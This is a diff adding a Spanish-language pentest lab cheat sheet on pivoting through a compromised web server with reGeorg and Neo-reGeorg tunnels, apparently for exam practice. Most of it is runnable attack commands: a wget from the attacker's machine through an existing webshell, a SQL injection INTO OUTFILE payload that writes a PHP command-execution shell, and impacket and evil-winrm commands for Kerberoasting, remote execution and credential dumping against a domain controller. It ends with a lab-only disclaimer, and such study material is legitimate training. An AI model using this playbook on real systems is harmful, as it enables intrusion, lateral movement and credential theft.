@@ -1,0 +1,257 @@
+================================================================
+  reGeorg - HTTP Tunneling para Pivoting en Redes NAT
+  D1n0 | Ethical Hacking Lab
+================================================================
+
+----------------------------------------------------------------
+TOPOLOGIA DEL LABORATORIO
+----------------------------------------------------------------
+
+  [ Kali Linux ] <--NAT1--> [ DVWA ] <--NAT2--> [ WebForPentesters ]
+       |                    (pivot)                   (objetivo)
+       |                       |
+       +--- reGeorg client     +--- tunnel.php (webshell)
+
+  Problema: Kali no tiene acceso directo a NAT2.
+  Solucion: Tunelizar trafico a traves de DVWA usando reGeorg.
+
+----------------------------------------------------------------
+QUE ES reGeorg
+----------------------------------------------------------------
+
+reGeorg crea un tunel SOCKS a traves de un webshell PHP subido
+en el servidor comprometido (DVWA). Combinado con proxychains,
+cualquier herramienta en Kali puede enrutar su trafico hacia
+la red interna (NAT2) como si estuviera dentro del servidor.
+
+Flujo (reGeorg clasico):
+  Kali --> reGeorg.py (SOCKS4:8888) --> tunnel.php en DVWA --> NAT2
+
+Flujo (Neo-reGeorg):
+  Kali --> neoreg.py  (SOCKS5:1080) --> tunnel.php en DVWA --> NAT2
+
+----------------------------------------------------------------
+DIFERENCIA reGeorg vs Neo-reGeorg
+----------------------------------------------------------------
+
+                  reGeorg clasico       Neo-reGeorg
+SOCKS             SOCKS4                SOCKS5
+Python            python2.7             python3
+Autenticacion     No                    Si (-k password)
+Estabilidad       Menor                 Mayor
+PHP moderno       Puede fallar          Compatible PHP 7+
+proxychains       socks4 127.0.0.1      socks5 127.0.0.1
+Recomendado       Entornos legacy       Uso general
+
+REGLA: Si el servidor tiene PHP 7+ → usar Neo-reGeorg.
+
+----------------------------------------------------------------
+INSTALACION
+----------------------------------------------------------------
+
+  # reGeorg clasico
+  git clone https://github.com/sensepost/reGeorg.git
+
+  # Neo-reGeorg (recomendado)
+  git clone https://github.com/L-codes/Neo-reGeorg.git
+
+  # Ignorar del repo propio
+  echo "reGeorg/" >> ../.gitignore
+  echo "Neo-reGeorg/" >> ../.gitignore
+
+----------------------------------------------------------------
+PASO 1 - Generar y subir tunnel.php
+----------------------------------------------------------------
+
+  [reGeorg clasico]
+  Webshells disponibles en reGeorg/tunnels/
+    tunnel.php   → PHP
+    tunnel.ashx  → ASP.NET
+    tunnel.jsp   → Java
+
+  [Neo-reGeorg] → hay que generar el tunnel con clave primero
+  cd Neo-reGeorg/
+  python3 neoreg.py generate -k password123
+  # genera: neoreg_tunnels/tunnel.php (y .aspx .jsp etc)
+
+  ---
+
+  Opcion A: File Upload directo
+    Sube tunnel.php al servidor via formulario vulnerable
+    URL resultante: http://<IP_DMZ>/uploads/tunnel.php
+
+  Opcion B: Via webshell ya existente (RCE)
+    curl "http://<IP_DMZ>/shell.php?cmd=wget+http://<KALI_IP>/tunnel.php+-O+/var/www/html/uploads/tunnel.php"
+
+  Opcion C: Via SQLi con INTO OUTFILE (requiere FILE privilege)
+    ' UNION SELECT '<?php system($_GET["cmd"]); ?>'
+      INTO OUTFILE '/var/www/html/uploads/tunnel.php'-- -
+
+  ---
+
+  Verificar que esta accesible:
+    curl http://<IP_DMZ>/uploads/tunnel.php
+
+    reGeorg    → respuesta: "Georg says, 'All seems fine'"
+    Neo-reGeorg → respuesta: pagina con estado del tunnel
+
+----------------------------------------------------------------
+PASO 2 - Lanzar el cliente
+----------------------------------------------------------------
+
+  [reGeorg clasico]
+  python2.7 reGeorg.py -u http://<IP_DMZ>/uploads/tunnel.php -p 8888
+    -u   URL al tunnel.php
+    -p   Puerto local SOCKS (default 8888)
+    --loglevel DEBUG  para mas detalle
+
+  [Neo-reGeorg]
+  python3 neoreg.py -k password123 -u http://<IP_DMZ>/uploads/tunnel.php -p 1080
+    -k   Clave usada al generar el tunnel (debe coincidir)
+    -u   URL al tunnel.php generado
+    -p   Puerto local SOCKS5 (convencion: 1080)
+
+  IMPORTANTE: Deja esta terminal abierta. El tunel vive mientras
+  el proceso esta corriendo.
+
+----------------------------------------------------------------
+PASO 3 - Configurar /etc/proxychains4.conf
+----------------------------------------------------------------
+
+  sudo nano /etc/proxychains4.conf
+  # Si sudo se cuelga: editar copia local (ver seccion abajo)
+
+  Cambios necesarios:
+    1. Descomentar "dynamic_chain"
+    2. Comentar "strict_chain"
+    3. Editar [ProxyList] al final:
+
+  Para reGeorg clasico:
+    [ProxyList]
+    socks4  127.0.0.1  8888
+
+  Para Neo-reGeorg:
+    [ProxyList]
+    socks5  127.0.0.1  1080
+
+  Por que socks5 con Neo-reGeorg:
+    - socks5 soporta autenticacion (Neo-reGeorg usa clave -k)
+    - socks5 resuelve DNS a traves del tunel (necesario para FQDN de dominio)
+    - socks4 solo soporta TCP e IPv4, sin auth
+
+  Por que puerto 1080:
+    - Es el puerto estandar SOCKS por convencion (como 80→HTTP)
+    - No hay obligacion tecnica, puede ser cualquier puerto libre
+    - Lo importante es que coincida en neoreg.py (-p) y proxychains4.conf
+
+  ---
+
+  Si no tienes permisos para editar /etc/ → copia local:
+    cp /etc/proxychains4.conf ~/proxychains_exam.conf
+    nano ~/proxychains_exam.conf        # sin sudo
+    # Al lanzar la terminal dinamica:
+    proxychains4 -q -f ~/proxychains_exam.conf bash
+
+----------------------------------------------------------------
+PASO 4 - MODO EXAMEN: Terminal Dinamica
+----------------------------------------------------------------
+
+  En lugar de escribir "proxychains" delante de cada comando,
+  se abre una bash que ya enruta todo automaticamente por el tunel.
+
+  proxychains4 -q bash
+  # -q = quiet (sin spam de [proxychains] en cada linea)
+
+  A partir de aqui TODO el trafico va por el tunel sin prefijos:
+    nmap -sT -Pn -n --open -p 80,443,445,88,3389,5985 <DC_IP>
+    impacket-psexec dominio/user:'pass'@<DC_IP>
+    evil-winrm -i <DC_IP> -u user -p 'pass'
+    impacket-GetUserSPNs dominio/user:'pass' -dc-ip <DC_IP> -request
+
+  ESQUEMA DE TERMINALES EN EL EXAMEN:
+
+    TERMINAL 1 (no tocar)
+    └── python3 neoreg.py -k password -u http://<DMZ>/uploads/tunnel.php -p 1080
+
+    TERMINAL 2 (trabajo)
+    └── proxychains4 -q bash
+        ├── nmap -sT -Pn -n --open <DC_IP>
+        ├── impacket-psexec ...
+        └── evil-winrm ...
+
+----------------------------------------------------------------
+PASO 5 - nmap a traves del tunel (flags obligatorios)
+----------------------------------------------------------------
+
+  nmap -sT -Pn -n --open -p 80,443,445,88,3389,5985 <DC_IP>
+
+  -sT  → TCP connect scan (SYN no funciona por SOCKS)
+  -Pn  → no ping (ICMP no pasa por SOCKS)
+  -n   → no resolucion DNS en Kali (evita timeouts)
+  --open → solo puertos abiertos (mas rapido)
+
+  Los tres flags son OBLIGATORIOS con proxychains.
+
+----------------------------------------------------------------
+COMPROBACION RAPIDA - FLUJO COMPLETO EXAMEN
+----------------------------------------------------------------
+
+  # 1. Generar tunnel (Neo-reGeorg)
+  python3 neoreg.py generate -k password123
+
+  # 2. Subir tunnel.php al servidor DMZ (por el vector que sea)
+  curl http://<DMZ>/uploads/tunnel.php
+    --> debe responder OK
+
+  # 3. Lanzar el tunel (TERMINAL 1 - no cerrar)
+  python3 neoreg.py -k password123 -u http://<DMZ>/uploads/tunnel.php -p 1080
+
+  # 4. Verificar /etc/proxychains4.conf
+  #    dynamic_chain activado
+  #    socks5 127.0.0.1 1080 en [ProxyList]
+
+  # 5. Abrir terminal dinamica (TERMINAL 2 - aqui trabajas)
+  proxychains4 -q bash
+
+  # 6. Reconocimiento del DC desde la terminal dinamica
+  nmap -sT -Pn -n --open -p 80,443,445,88,3389,5985 <DC_IP>
+
+  # 7. Atacar el DC con impacket/evil-winrm directamente
+  impacket-GetUserSPNs dominio/user:'pass' -dc-ip <DC_IP> -request
+  evil-winrm -i <DC_IP> -u user -p 'pass'
+  impacket-psexec dominio/user:'pass'@<DC_IP>
+  impacket-secretsdump dominio/user:'pass'@<DC_IP>
+
+----------------------------------------------------------------
+SOLUCION DE PROBLEMAS
+----------------------------------------------------------------
+
+Error: "Georg says, file not found"
+  --> El path al .php es incorrecto. Verifica la URL con curl.
+
+Error: Connection refused en 127.0.0.1:1080
+  --> neoreg.py no esta corriendo. Lanzalo en otra terminal.
+
+Error: proxychains can't connect
+  --> El puerto en proxychains4.conf no coincide con -p de neoreg.
+
+Error: nmap no devuelve resultados
+  --> Faltan flags. Usar obligatoriamente: -sT -Pn -n
+
+Error: tunnel.php devuelve 403/404
+  --> Ruta incorrecta o permisos insuficientes.
+      Verificar ruta exacta con curl.
+
+Error: sudo se cuelga al editar proxychains4.conf
+  --> Usar copia local: cp /etc/proxychains4.conf ~/proxychains_exam.conf
+      Y lanzar: proxychains4 -q -f ~/proxychains_exam.conf bash
+
+----------------------------------------------------------------
+NOTA DE SEGURIDAD
+----------------------------------------------------------------
+
+  Esta guia es para uso exclusivo en entornos de laboratorio
+  controlados (DVWA, PentesterLab). El uso de estas tecnicas
+  en sistemas sin autorizacion explicita es ilegal.
+
+================================================================
